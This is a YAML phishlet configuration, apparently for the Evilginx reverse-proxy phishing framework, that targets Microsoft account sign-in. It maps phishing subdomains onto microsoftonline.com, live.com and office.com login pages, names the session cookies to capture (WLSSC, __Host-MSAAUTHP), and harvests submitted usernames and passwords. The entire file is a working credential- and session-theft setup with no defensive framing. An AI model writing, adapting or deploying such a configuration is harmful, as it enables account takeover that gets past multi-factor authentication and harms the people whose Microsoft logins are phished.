author: "@DanteChoppaXXX"
min_ver: "3.0.0"
proxy_hosts:
  - {
      phish_sub: "login",
      orig_sub: "login",
      domain: "microsoftonline.com",
      session: true,
      is_landing: true,
    }
  - {
      phish_sub: "logon",
      orig_sub: "login",
      domain: "live.com",
      session: true,
      is_landing: false,
    }
  - {
      phish_sub: "account",
      orig_sub: "account",
      domain: "live.com",
      session: true,
      is_landing: false,
    }
  - {
      phish_sub: "www",
      orig_sub: "www",
      domain: "office.com",
      session: true,
      is_landing: false,
    }
sub_filters:
#   - {
#       triggers_on: "breakdev.org",
#       orig_sub: "academy",
#       domain: "breakdev.org",
#       search: "something_to_look_for",
#       replace: "replace_it_with_this",
#       mimes: ["text/html"],
#     }
auth_tokens:
  - domain: ".live.com"
    keys: ["WLSSC"]
  - domain: "login.live.com"
    keys: ["__Host-MSAAUTHP"]
credentials:
  username:
    key: "login"
    search: "(.*)"
    type: "post"
  password:
    key: "passwd"
    search: "(.*)"
    type: "post"
login:
  domain: "login.microsoftonline.com"
  path: "/"
